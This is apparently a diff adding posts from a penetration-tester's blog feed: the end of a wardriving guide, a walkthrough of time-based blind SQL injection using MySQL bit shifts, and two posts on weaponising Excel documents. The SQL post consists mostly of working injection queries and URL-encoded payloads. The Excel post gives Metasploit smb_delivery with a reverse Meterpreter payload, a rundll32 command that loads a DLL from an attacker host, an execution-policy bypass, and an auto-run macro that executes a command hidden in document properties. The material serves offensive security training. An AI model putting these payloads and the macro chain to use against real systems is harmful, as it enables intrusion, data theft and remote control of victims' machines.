+<p>To check whether your GPS receiver has locked onto satellites we can use cpsg which is used to test clients for gpsd, run the following command in a new tab or terminal window</p>
+<pre tabindex="0"><code>root@hunter~# cgps -s
+</code></pre><ul>
+<li><strong>-s</strong> Be silent (don’t print raw gpsd data)</li>
+</ul>
+<p><img src="/wp-content/uploads/2019/03/GPS-KISMET-1.jpg" alt=""></p>
+<p>Like above you should see some relavant details regarding your position, heading and speed. If you don’t see something like the above then something has gone wrong.</p>
+<h2 id="on-to-kismet">On to Kismet</h2>
+<p>Ok, now that we know our GPS receiver is working fine from the above steps let’s launch Kismet and start collecting data.</p>
+<pre tabindex="0"><code>root@hunter~# kismet
+</code></pre><h2 id="initial-steps">Initial Steps</h2>
+<p>You will be asked a few questions when launching kismet which are pretty straight forward.</p>
+<p><img src="/wp-content/uploads/2019/03/GPS-KISMET-5.png" alt=""></p>
+<p>I was running my kali instance as root so if you are too you can ignore this and hit OK.</p>
+<p><img src="/wp-content/uploads/2019/03/GPS-KISMET-6.png" alt=""></p>
+<p>Select Yes here.</p>
+<p><img src="/wp-content/uploads/2019/03/GPS-KISMET-7.png" alt=""></p>
+<p>You can either change these or leave them as default. Next you will see a console window which you can close. You will then be asked to add a source which will be the name of your Wireless Device in my case it was wlan1</p>
+<p><img src="/wp-content/uploads/2019/03/GPS-KISMET-8.png" alt=""> <img src="/wp-content/uploads/2019/03/GPS-KISMET-9.png" alt=""></p>
+<p>Once you have entered the correct device name select “Add”</p>
+<h2 id="capturing">Capturing</h2>
+<p>After the above steps you should now start seeing Kismet being populated with any Wireless SSID’s that it’s detected. Similar to the screenshot below. If it is then well done you’re successfully capturing wireless data.</p>
+<p><img src="/wp-content/uploads/2019/03/GPS-KISMET-10-1.png" alt=""></p>
+<h2 id="handling-the-data">Handling the Data</h2>
+<p>GISKismet is a wireless recon visualisation tool to represent the data gathered using Kismet, we can use this tool to import our captured data and then export into a format which is usable with GoogleEarth so we can visualise our Wardrive. Let’s go ahead and issue our command.</p>
+<pre tabindex="0"><code>root@hunter~# giskismet -x Kismet-(YOURFILE HERE).netxml
+</code></pre><p>We use the <strong>-x</strong> switch to tell the tool we’re importing an XML file, ensure you enter your capture file with the <strong>.netxml extension</strong>.</p>
+<p><img src="/wp-content/uploads/2019/03/GPS-KISMET-11.png" alt=""></p>
+<p>Now we’ve imported our captured data into GISKismet’s SQLite database we can now grab that data by performing a simple SQL query and exporting it into a kml file which is usable by GoogleEarth. Obviously name your ouput file anything you like.</p>
+<pre tabindex="0"><code>root@hunter~# giskismet -q &#34;SELECT * FROM wireless&#34; -o YOURNEWFILE.kml
+</code></pre><ul>
+<li><strong>-q</strong> Query</li>
+<li><strong>-o</strong> Output file</li>
+</ul>
+<p>So we now have our newly created .kml file which you can open using GoogleEarth and you should have similar results to the below screenshot.</p>
+<p><img src="/wp-content/uploads/2019/03/Wireless-Map-1024x822.png" alt=""></p>
+<p>I Hope you found this guide quick, to the point and most of all helpful.</p>
+<h3 id="about-the-author">About The Author</h3>
+<ul>
+<li>
+<p><a href="/"></a></p>
+<p><a href="https://www.facebook.com/sharer.php?u=/wardriving-with-kismet-gps-and-google-earth/">**</a> <a href="http://twitter.com/share?url=https://smittix.github.io/wardriving-with-kismet-gps-and-google-earth/&amp;text=Wardriving%20with%20Kismet%2C%20GPS%20and%20Google%20Earth.">**</a> <a href="mailto:?subject=Wardriving%20with%20Kismet,%20GPS%20and%20Google%20Earth.&amp;body=/wardriving-with-kismet-gps-and-google-earth/">**</a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://smittix.github.io/wardriving-with-kismet-gps-and-google-earth/&amp;title=Wardriving%20with%20Kismet%2C%20GPS%20and%20Google%20Earth.">**</a> <a href="">**</a> <a href="https://t.me/share/url?url=https://smittix.github.io/wardriving-with-kismet-gps-and-google-earth/&amp;title=Wardriving%20with%20Kismet%2C%20GPS%20and%20Google%20Earth.">**</a> <a href="https://api.whatsapp.com/send?text=/wardriving-with-kismet-gps-and-google-earth/&amp;title=Wardriving%20with%20Kismet%2C%20GPS%20and%20Google%20Earth.">**</a> <a href="https://www.reddit.com/submit?url=https://smittix.github.io/wardriving-with-kismet-gps-and-google-earth/&amp;title=Wardriving%20with%20Kismet%2C%20GPS%20and%20Google%20Earth.">**</a> <a href="">**</a></p>
+</li>
+</ul>
+<h2 id="post-navigation">Post navigation</h2>
+<p><a href="/posts/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/">Efficient Time Based Blind SQL Injection using MySQL Bit Functions and Operators</a><a href="/posts/rapidly-creating-fake-users-in-your-lab-ad-using-youzer/">Rapidly Creating Fake Users in your Lab AD using Youzer</a></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Efficient Time Based Blind SQL Injection using MySQL Bit Functions and Operators</title>
+            <link>https://smittix.github.io/posts/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/</link>
+            <pubDate>Sat, 16 Dec 2017 00:00:00 +0000</pubDate>
+            
+            <guid>https://smittix.github.io/posts/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/</guid>
+            <description>&lt;p&gt;I was performing some penetration tests in 2011 – 2012 against various PHP applications integrated with MySQL databases which were vulnerable to Time Based Blind SQL Injection. Due to various constraints and limitations, exploitation was a little tricky and I was forced to investigate a method which allowed me to retrieve data with as little requests as possible.&lt;/p&gt;
+&lt;p&gt;I stumbled across this paper demonstrating SQL injection using Bit shifting techniques: &lt;a href=&#34;https://www.exploit-db.com/papers/17073/&#34;&gt;https://www.exploit-db.com/papers/17073/&lt;/a&gt;&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<p>I was performing some penetration tests in 2011 – 2012 against various PHP applications integrated with MySQL databases which were vulnerable to Time Based Blind SQL Injection. Due to various constraints and limitations, exploitation was a little tricky and I was forced to investigate a method which allowed me to retrieve data with as little requests as possible.</p>
+<p>I stumbled across this paper demonstrating SQL injection using Bit shifting techniques: <a href="https://www.exploit-db.com/papers/17073/">https://www.exploit-db.com/papers/17073/</a></p>
+<p>During a recent CTF exercise on Hack the Box (<a href="https://www.hackthebox.eu/">https://www.hackthebox.eu/</a>) I found myself revisiting this method to exploit some tricky SQL injection.</p>
+<p>This blog post will demonstrate how the ‘right shift’ Operator ( <strong>&raquo;</strong> ) can be used to enumerate the Binary bits of a value returned from a SQL query.</p>
+<p><strong>Note: A full description of Bit Functions and Operators can be found at the following URL:</strong> <a href="https://dev.mysql.com/doc/refman/5.7/en/bit-functions.html">https://dev.mysql.com/doc/refman/5.7/en/bit-functions.html</a></p>
+<p>The right shift operator will shift the number of bits of a binary value 1 location to the right, as illustrated in the example below:</p>
+<pre tabindex="0"><code>mysql&gt; select ascii(b&#39;01110010&#39;);
+
++--------------------+
+
+| ascii(b&#39;01110010&#39;) |
+
++--------------------+
+
+|                114 |
+
++--------------------+
+
+1 row in set (0.00 sec)
+
+mysql&gt; select ascii(b&#39;01110010&#39;) &gt;&gt; 1;
+
++-------------------------+
+
+| ascii(b&#39;01110010&#39;) &gt;&gt; 1 |
+
++-------------------------+
+
+|                      57 |
+
++-------------------------+
+
+1 row in set (0.00 sec)
+</code></pre><p>This can be utilised to enumerate a character of a string when exploiting Blind SQL injection. This guarantees that the data can be enumerated by a maximum of 8 requests per character if it appears within the full ASCII table.</p>
+<p>The data we wish to extract via this method is the first character returned for the query: <em>select user()</em></p>
+<p><a href="/wp-content/uploads/2017/12/0-1.jpg"><img src="/wp-content/uploads/2017/12/0-1.jpg" alt=""></a></p>
+<p><strong>First Bit:</strong> We start by finding the value of the <strong>first</strong> bit:</p>
+<p><strong>?</strong>???????</p>
+<p>Two possibilities for this:</p>
+<p><strong>0</strong> (Decimal value: <strong>0</strong>) // TRUE condition</p>
+<p>OR</p>
+<p><strong>1</strong> (Decimal value: <strong>1</strong>) // FALSE condition</p>
+<pre tabindex="0"><code>mysql&gt; select if ((ascii((substr(user(),1,1))) &gt;&gt; 7 )=0,benchmark(10000000,sha1(&#39;test&#39;)), &#39;false&#39;);
+
++--------------------------------------------------------------------------------------+
+
+| if ((ascii((substr(user(),1,1))) &gt;&gt; 7 )=0,benchmark(10000000,sha1(&#39;test&#39;)), &#39;false&#39;) |
+
++--------------------------------------------------------------------------------------+
+
+| 0                                                                                    |
+
++--------------------------------------------------------------------------------------+
+
+1 row in set (2.35 sec)
+</code></pre><p>The SQL query resulted in a time delay, therefore the condition is TRUE, resulting in the <strong>first</strong> bit being <strong>0</strong> <strong>0</strong>???????</p>
+<p><a href="/wp-content/uploads/2017/12/1.jpg"><img src="/wp-content/uploads/2017/12/1.jpg" alt=""></a></p>
+<p>Second Bit:**</p>
+<p>Now we need find the value of the <strong>second</strong> bit. As before, there are two possibilities for this:</p>
+<p>0<strong>0</strong> (Decimal value: <strong>0</strong>) // TRUE condition</p>
+<p>OR</p>
+<p>0<strong>1</strong> (Decimal value: <strong>1</strong>) // FALSE condition</p>
+<pre tabindex="0"><code>mysql&gt; select if ((ascii((substr(user(),1,1))) &gt;&gt; 6 )=0,benchmark(10000000,sha1(&#39;test&#39;)), &#39;false&#39;);
+
++--------------------------------------------------------------------------------------+
+
+| if ((ascii((substr(user(),1,1))) &gt;&gt; 6 )=0,benchmark(10000000,sha1(&#39;test&#39;)), &#39;false&#39;) |
+
++--------------------------------------------------------------------------------------+
+
+| false                                                                                |
+
++--------------------------------------------------------------------------------------+
+
+1 row in set (0.00 sec)
+</code></pre><p>The SQL query resulted in no time delay, therefore the condition is FALSE, resulting in the <strong>second <strong>bit being <strong>1</strong> 0</strong>1</strong>?????</p>
+<p><a href="/wp-content/uploads/2017/12/2.jpg"><img src="/wp-content/uploads/2017/12/2.jpg" alt=""></a></p>
+<p><strong>Third Bit:</strong> Now we need find the value of the <strong>third</strong> bit. As before, there are two possibilities for this:</p>
+<p>01<strong>0</strong> (Decimal value: <strong>2</strong>) // TRUE</p>
+<p>OR</p>
+<p>01<strong>1</strong> (Decimal value: <strong>3</strong>) // FALSE</p>
+<pre tabindex="0"><code>mysql&gt; select if ((ascii((substr(user(),1,1))) &gt;&gt; 5 )=2,benchmark(10000000,sha1(&#39;test&#39;)), &#39;false&#39;);
+
++--------------------------------------------------------------------------------------+
+
+| if ((ascii((substr(user(),1,1))) &gt;&gt; 5 )=2,benchmark(10000000,sha1(&#39;test&#39;)), &#39;false&#39;) |
+
++--------------------------------------------------------------------------------------+
+
+| false                                                                                |
+
++--------------------------------------------------------------------------------------+
+
+1 row in set (0.00 sec)
+</code></pre><p>The SQL query resulted in no time delay, therefore the condition is FALSE, resulting in the <strong>third</strong> bit being <strong>1</strong> 01<strong>1</strong>?????</p>
+<p><a href="/wp-content/uploads/2017/12/3.jpg"><img src="/wp-content/uploads/2017/12/3.jpg" alt=""></a></p>
+<p><strong>Fourth Bit:</strong> Now we need find the value of the <strong>fourth</strong> bit. As before, there are two possibilities for this:</p>
+<p>011<strong>0</strong> (Decimal: <strong>6</strong>) // TRUE</p>
+<p>OR</p>
+<p>011<strong>1</strong> (Decimal: <strong>7</strong>) // FALSE</p>
+<pre tabindex="0"><code>mysql&gt; select if ((ascii((substr(user(),1,1))) &gt;&gt; 4 )=6,benchmark(10000000,sha1(&#39;test&#39;)), &#39;false&#39;);
+
++--------------------------------------------------------------------------------------+
+
+| if ((ascii((substr(user(),1,1))) &gt;&gt; 4 )=6,benchmark(10000000,sha1(&#39;test&#39;)), &#39;false&#39;) |
+
++--------------------------------------------------------------------------------------+
+
+| false                                                                                |
+
++--------------------------------------------------------------------------------------+
+
+1 row in set (0.00 sec)
+</code></pre><p>The SQL query resulted in no time delay, therefore the condition is FALSE, resulting in the <strong>fourth</strong> bit being <strong>1</strong> 011<strong>1</strong>????</p>
+<p><a href="/wp-content/uploads/2017/12/4.jpg"><img src="/wp-content/uploads/2017/12/4.jpg" alt=""></a></p>
+<p><strong>Fifth Bit:</strong> Now we need find the value of the <strong>fifth</strong> bit. As before, there are two possibilities for this:</p>
+<p>0111<strong>0</strong> (Decimal: <strong>14</strong>) /// TRUE</p>
+<p>OR</p>
+<p>0111<strong>1</strong> (Decimal: <strong>15</strong>) // FALSE</p>
+<pre tabindex="0"><code>mysql&gt; select if ((ascii((substr(user(),1,1))) &gt;&gt; 3 )=14,benchmark(10000000,sha1(&#39;test&#39;)), &#39;false&#39;);
+
++---------------------------------------------------------------------------------------+
+
+| if ((ascii((substr(user(),1,1))) &gt;&gt; 3 )=14,benchmark(10000000,sha1(&#39;test&#39;)), &#39;false&#39;) |
+
++---------------------------------------------------------------------------------------+
+
+| 0                                                                                     |
+
++---------------------------------------------------------------------------------------+
+
+1 row in set (2.46 sec)
+</code></pre><p>The SQL query resulted in a time delay, therefore the condition is <strong>TRUE</strong>, resulting in the <strong>fifth <strong>bit being <strong>0</strong> 0111</strong>0</strong>???</p>
+<p><a href="/wp-content/uploads/2017/12/5.jpg"><img src="/wp-content/uploads/2017/12/5.jpg" alt=""></a></p>
+<p><strong>Sixth Bit:</strong> Now we need find the value of the <strong>sixth</strong> bit. As before, there are two possibilities for this:</p>
+<p>01110<strong>0</strong> (Decimal: <strong>28</strong>) // TRUE</p>
+<p>OR</p>
+<p>01110<strong>1</strong> (Decimal: <strong>29</strong>) // FALSE</p>
+<pre tabindex="0"><code>mysql&gt; select if ((ascii((substr(user(),1,1))) &gt;&gt; 2 )=28,benchmark(10000000,sha1(&#39;test&#39;)), &#39;false&#39;);
+
++---------------------------------------------------------------------------------------+
+
+| if ((ascii((substr(user(),1,1))) &gt;&gt; 2 )=28,benchmark(10000000,sha1(&#39;test&#39;)), &#39;false&#39;) |
+
++---------------------------------------------------------------------------------------+
+
+| 0                                                                                     |
+
++---------------------------------------------------------------------------------------+
+
+1 row in set (2.44 sec)
+</code></pre><p>The SQL query resulted in a time delay, therefore the condition is <strong>TRUE</strong>, resulting in the <strong>sixth <strong>bit being <strong>0</strong> 01110</strong>0</strong>??</p>
+<p><a href="/wp-content/uploads/2017/12/6.jpg"><img src="/wp-content/uploads/2017/12/6.jpg" alt=""></a></p>
+<p><strong>Seventh Bit:</strong> Now we need find the value of the **seventh **bit. As before, there are two possibilities for this:</p>
+<p>011100<strong>0</strong> (Decimal: 56) // TRUE</p>
+<p>OR</p>
+<p>011100<strong>1</strong> (Decimal: 57) // FALSE</p>
+<pre tabindex="0"><code>mysql&gt; select if ((ascii((substr(user(),1,1))) &gt;&gt; 1 )=56,benchmark(10000000,sha1(&#39;test&#39;)), &#39;false&#39;);
+
++---------------------------------------------------------------------------------------+
+
+| if ((ascii((substr(user(),1,1))) &gt;&gt; 1 )=56,benchmark(10000000,sha1(&#39;test&#39;)), &#39;false&#39;) |
+
++---------------------------------------------------------------------------------------+
+
+| false                                                                                 |
+
++---------------------------------------------------------------------------------------+
+
+1 row in set (0.00 sec)
+</code></pre><p>The SQL query resulted in no time delay, therefore the condition is FALSE, resulting in the <strong>seventh</strong> bit being <strong>1</strong> The fourth bit must be <strong>1</strong> 011100<strong>1</strong>?</p>
+<p><a href="/wp-content/uploads/2017/12/7.jpg"><img src="/wp-content/uploads/2017/12/7.jpg" alt=""></a></p>
+<p><strong>Eighth Bit:</strong> Now we need find the value of the **eighth and final **bit. As before, there are two possibilities for this:</p>
+<p>0111001<strong>0</strong> (Decimal: <strong>114</strong>) // TRUE</p>
+<p>OR</p>
+<p>0111001<strong>1</strong> (Decimal: <strong>115</strong>) // FALSE</p>
+<pre tabindex="0"><code>mysql&gt; select if ((ascii((substr(user(),1,1))) &gt;&gt; 0 )=114,benchmark(10000000,sha1(&#39;test&#39;)), &#39;false&#39;);
+
++----------------------------------------------------------------------------------------+
+
+| if ((ascii((substr(user(),1,1))) &gt;&gt; 0 )=114,benchmark(10000000,sha1(&#39;test&#39;)), &#39;false&#39;) |
+
++----------------------------------------------------------------------------------------+
+
+| 0                                                                                      |
+
++----------------------------------------------------------------------------------------+
+
+1 row in set (2.33 sec)
+</code></pre><p>The SQL query resulted in a time delay, therefore the condition is <strong>TRUE</strong>, resulting in the <strong>eight <strong>bit being <strong>0</strong> 0111001</strong>0</strong> <a href="/wp-content/uploads/2017/12/8.jpg"><img src="/wp-content/uploads/2017/12/8.jpg" alt=""></a></p>
+<p>Now we can conclude that the binary value for the first character returned by the query: <em>select user()</em> is <strong>01110010</strong> resulting in a decimal value of <strong>114</strong>. 114 being the ‘<strong>r</strong>’ character of the ASCII table.</p>
+<pre tabindex="0"><code>mysql&gt; select user();
+
++----------------+
+
+| user()         |
+
++----------------+
+
+| root@localhost |
+
++----------------+
+
+1 row in set (0.00 sec)
+</code></pre><p>In order to demonstrate this type of Blind SQL injection attack, I have demenstrated how to enumerate the first and last binary bit of the first character returned by ‘<em>select user()</em>’ on the bWAPP vulnerable application: (<a href="https://www.vulnhub.com/entry/bwapp-bee-box-v16,53/">https://www.vulnhub.com/entry/bwapp-bee-box-v16,53/</a>)</p>
+<ol>
+<li>SQLi string returning a TRUE condition for the first bit:</li>
+</ol>
+<pre tabindex="0"><code>test%27+and+if+((ascii((substr(user(),1,1)))+&gt;&gt;+7+)=0,benchmark(5000000,md5(&#39;test&#39;)),+&#39;false&#39;)%23
+</code></pre><p><a href="/wp-content/uploads/2017/12/ks-sql1.jpg"><img src="/wp-content/uploads/2017/12/ks-sql1.jpg" alt=""></a></p>
+<ol>
+<li>SQLi string returning a FALSE condition for the first bit:</li>
+</ol>
+<pre tabindex="0"><code>test%27+and+if+((ascii((substr(user(),1,1)))+&gt;&gt;+7+)=1,benchmark(5000000,md5(&#39;test&#39;)),+&#39;false&#39;)%23
+</code></pre><p><a href="/wp-content/uploads/2017/12/ks-sql2.jpg"><img src="/wp-content/uploads/2017/12/ks-sql2.jpg" alt=""></a></p>
+<ol>
+<li>SQLi string returning a TRUE condition for the eight bit:</li>
+</ol>
+<pre tabindex="0"><code>test%27+and+if+((ascii((substr(user(),1,1)))+&gt;&gt;+0+)=114,benchmark(5000000,md5(&#39;test&#39;)),+&#39;false&#39;)%23
+</code></pre><p><a href="/wp-content/uploads/2017/12/ks-sql3.jpg"><img src="/wp-content/uploads/2017/12/ks-sql3.jpg" alt=""></a></p>
+<h3 id="about-the-author">About The Author</h3>
+<ul>
+<li>
+<p><a href="/"></a></p>
+<p><a href="https://www.facebook.com/sharer.php?u=/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/">**</a> <a href="http://twitter.com/share?url=https://smittix.github.io/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/&amp;text=Efficient%20Time%20Based%20Blind%20SQL%20Injection%20using%20MySQL%20Bit%20Functions%20and%20Operators">**</a> <a href="mailto:?subject=Efficient%20Time%20Based%20Blind%20SQL%20Injection%20using%20MySQL%20Bit%20Functions%20and%20Operators&amp;body=/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/">**</a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://smittix.github.io/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/&amp;title=Efficient%20Time%20Based%20Blind%20SQL%20Injection%20using%20MySQL%20Bit%20Functions%20and%20Operators">**</a> <a href="">**</a> <a href="https://t.me/share/url?url=https://smittix.github.io/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/&amp;title=Efficient%20Time%20Based%20Blind%20SQL%20Injection%20using%20MySQL%20Bit%20Functions%20and%20Operators">**</a> <a href="https://api.whatsapp.com/send?text=/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/&amp;title=Efficient%20Time%20Based%20Blind%20SQL%20Injection%20using%20MySQL%20Bit%20Functions%20and%20Operators">**</a> <a href="https://www.reddit.com/submit?url=https://smittix.github.io/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/&amp;title=Efficient%20Time%20Based%20Blind%20SQL%20Injection%20using%20MySQL%20Bit%20Functions%20and%20Operators">**</a> <a href="">**</a></p>
+</li>
+</ul>
+<h2 id="post-navigation">Post navigation</h2>
+<p><a href="/posts/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/">Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 2 of 2)</a><a href="/posts/wardriving-with-kismet-gps-and-google-earth/">Wardriving with Kismet, GPS and Google Earth.</a></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 1 of 2)</title>
+            <link>https://smittix.github.io/posts/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/</link>
+            <pubDate>Wed, 06 Dec 2017 00:00:00 +0000</pubDate>
+            
+            <guid>https://smittix.github.io/posts/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/</guid>
+            <description>&lt;p&gt;As a penetration tester I’m always excited to see new and creative methods on creating weaponized MS Office documents. This blog post builds on the following findings published by Black Hills InfoSec: &lt;a href=&#34;https://www.blackhillsinfosec.com/hide-payload-ms-office-document-properties/&#34;&gt;https://www.blackhillsinfosec.com/hide-payload-ms-office-document-properties/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;There are numerous ways on how MS Office documents can be abused and weaponised to deliver a variety of cyber-related attacks. This blog post will demonstrate how quickly and easy it is to hide a Metasploit and Empire payload within a MS Office document and execute it from an embedded Macro.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<p>As a penetration tester I’m always excited to see new and creative methods on creating weaponized MS Office documents. This blog post builds on the following findings published by Black Hills InfoSec: <a href="https://www.blackhillsinfosec.com/hide-payload-ms-office-document-properties/">https://www.blackhillsinfosec.com/hide-payload-ms-office-document-properties/</a></p>
+<p>There are numerous ways on how MS Office documents can be abused and weaponised to deliver a variety of cyber-related attacks. This blog post will demonstrate how quickly and easy it is to hide a Metasploit and Empire payload within a MS Office document and execute it from an embedded Macro.</p>
+<p><strong>Metasploit:</strong> In the first example I’m going to use a payload generated with Metasploits ‘SMB Delivery’ functionality to Weaponise a MS Excel document. The ‘SMB Delivery’ is a personal favourite of mine given its simplicity and subtle anti-virus evasion.</p>
+<p>Begin by loading the relevant module into Metasploit:</p>
+<pre tabindex="0"><code>use exploit/windows/smb/smb_delivery
+</code></pre><ul>
+<li>
+<ul>
+<li></li>
+</ul>
+</li>
+<li>
+<p><a href="/wp-content/uploads/2017/12/ks-msf1.jpg"><img src="/wp-content/uploads/2017/12/ks-msf1.jpg" alt=""></a>*</p>
+</li>
+</ul>
+<p>Set the payload to anything you desire, in this example I’ll be using the Windows Meterpreter Reverse HTTPS payload:</p>
+<pre tabindex="0"><code>set PAYLOAD windows/meterpreter/reverse_https
+</code></pre><ul>
+<li>
+<ul>
+<li></li>
+</ul>
+</li>
+</ul>
+<p><a href="/wp-content/uploads/2017/12/ks-msf2.jpg"><img src="/wp-content/uploads/2017/12/ks-msf2.jpg" alt=""></a></p>
+<p>Finally, issue the ‘<em>exploit</em>’ command to begin staging the attack:</p>
+<p><a href="/wp-content/uploads/2017/12/ks-msf3.jpg"><img src="/wp-content/uploads/2017/12/ks-msf3.jpg" alt=""></a></p>
+<p>Now, in order to utilise this, we will need execute the following command on the victim host:</p>
+<pre tabindex="0"><code>rundll32.exe \\192.168.0.11\PPuUdw\test.dll,0
+</code></pre><ul>
+<li>
+<ul>
+<li></li>
+</ul>
+</li>
+</ul>
+<p><strong>Note: the folder path is randomly generated as we didn’t explicitly define it within the Metasploit options</strong> In order to achieve this, we’re going to embed this command into a MS Excel document within the ‘comments’ property and execute it from an embedded Macro. This can easily be done by using the Powershell script: ‘Commentator’ (<a href="https://github.com/clr2of8/Commentator">https://github.com/clr2of8/Commentator</a>)</p>
+<p>Begin by starting PowerShell:</p>
+<pre tabindex="0"><code>powershell.exe -exec bypass
+</code></pre><ul>
+<li>
+<ul>
+<li></li>
+</ul>
+</li>
+</ul>
+<p>Import the module into your PowerShell environment:</p>
+<pre tabindex="0"><code>Import-Module .\Commentator.ps1
+</code></pre><ul>
+<li>
+<ul>
+<li></li>
+</ul>
+</li>
+</ul>
+<p>And execute the script to embed our payload into the ‘comments’ property of the MS Excel document:</p>
+<pre tabindex="0"><code>Invoke-Commentator -OfficeFile .\msf_smb_delivery.xlsx -Comment &#34;rundll32.exe \\192.168.0.11\PPuUdw\test.dll,0&#34;
+</code></pre><ul>
+<li>
+<ul>
+<li></li>
+</ul>
+</li>
+<li>
+<ul>
+<li></li>
+</ul>
+</li>
+</ul>
+<p>After successful execution, a copy of your existing MS Office file will be created with the payload embedded:</p>
+<p><em>The new file with added comment has been written to .\msf_smb_delivery-wlc.xlsx.</em></p>
+<p><em>DONE!</em></p>
+<p>This can be verified by inspecting the file’s metadata / properties:</p>
+<p><a href="/wp-content/uploads/2017/12/ks-msf4.jpg"><img src="/wp-content/uploads/2017/12/ks-msf4.jpg" alt=""></a></p>
+<p>Lastly, in order to execute the payload embedded within the ‘comments’ property, the following embedded Macro can be used:</p>
+<ul>
+<li>
+<ul>
+<li></li>
+</ul>
+</li>
+</ul>
+<pre tabindex="0"><code>Sub Workbook_Open()
+
+Dim p As DocumentProperty
+
+
+
+ For Each p In ActiveWorkbook.BuiltinDocumentProperties
+
+    If p.Name = &#34;Comments&#34; Then
+
+        Shell (p.Value)
+
+    End If
+
+ Next
+
+End Sub
+</code></pre><p><strong>Note: In order to utilise auto-execution via the ‘<em>Workbook_Open()</em>’ function, the weaponised MS Excel document needed to be downgraded to Office 98 – 2003 compatibility (.xls)</strong> <a href="/wp-content/uploads/2017/12/ks-msf5.jpg"><img src="/wp-content/uploads/2017/12/ks-msf5.jpg" alt=""></a></p>
+<p>After the victim has clicked ‘enable editing’ and ‘enable content’, a Meterpreter session should appear:</p>
+<ul>
+<li><a href="/wp-content/uploads/2017/12/ks-msf6.jpg"><img src="/wp-content/uploads/2017/12/ks-msf6.jpg" alt=""></a>*</li>
+</ul>
+<h3 id="about-the-author">About The Author</h3>
+<ul>
+<li>
+<p><a href="/"></a></p>
+<p><a href="https://www.facebook.com/sharer.php?u=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/">**</a> <a href="http://twitter.com/share?url=https://smittix.github.io/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/&amp;text=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%201%20of%202%29">**</a> <a href="mailto:?subject=Executing%20Metasploit%20%26amp;%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20(part%201%20of%202)&amp;body=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/">**</a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://smittix.github.io/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/&amp;title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%201%20of%202%29">**</a> <a href="">**</a> <a href="https://t.me/share/url?url=https://smittix.github.io/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/&amp;title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%201%20of%202%29">**</a> <a href="https://api.whatsapp.com/send?text=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/&amp;title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%201%20of%202%29">**</a> <a href="https://www.reddit.com/submit?url=https://smittix.github.io/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/&amp;title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%201%20of%202%29">**</a> <a href="">**</a></p>
+</li>
+</ul>
+<h2 id="post-navigation">Post navigation</h2>
+<p><a href="/posts/reporting-ssltls-issues-the-easy-way-with-yanp/">Reporting SSL/TLS Issues the Easy Way with YANP</a><a href="/posts/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/">Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 2 of 2)</a></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 2 of 2)</title>
+            <link>https://smittix.github.io/posts/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/</link>
+            <pubDate>Wed, 06 Dec 2017 00:00:00 +0000</pubDate>
+            
+            <guid>https://smittix.github.io/posts/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/</guid>
+            <description>&lt;p&gt;Building on from my previous post, this will primarily focus on delivering an Empire payload via an embedded offensive PowerShell script stored within the ‘comments’ property of an MS Excel document.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;PowerShell Empire:&lt;/strong&gt; Begin by creating an Empire listener, see Empire’s documentation on how to get started with this by visiting the following URL: &lt;a href=&#34;https://www.powershellempire.com/?page_id=83&#34;&gt;https://www.powershellempire.com/?page_id=83&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Note that in my configuration as illustrated in the screenshot below, the ‘Host’ entry, does not correspond to my C2 Empire Server, instead, this has been configured to point to a reverse-proxy utilising TLS / SSL encryption. This is considered to be good ‘OPSEC’ practice and allows easier portability.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<p>Building on from my previous post, this will primarily focus on delivering an Empire payload via an embedded offensive PowerShell script stored within the ‘comments’ property of an MS Excel document.</p>
+<p><strong>PowerShell Empire:</strong> Begin by creating an Empire listener, see Empire’s documentation on how to get started with this by visiting the following URL: <a href="https://www.powershellempire.com/?page_id=83">https://www.powershellempire.com/?page_id=83</a></p>
+<p>Note that in my configuration as illustrated in the screenshot below, the ‘Host’ entry, does not correspond to my C2 Empire Server, instead, this has been configured to point to a reverse-proxy utilising TLS / SSL encryption. This is considered to be good ‘OPSEC’ practice and allows easier portability.</p>
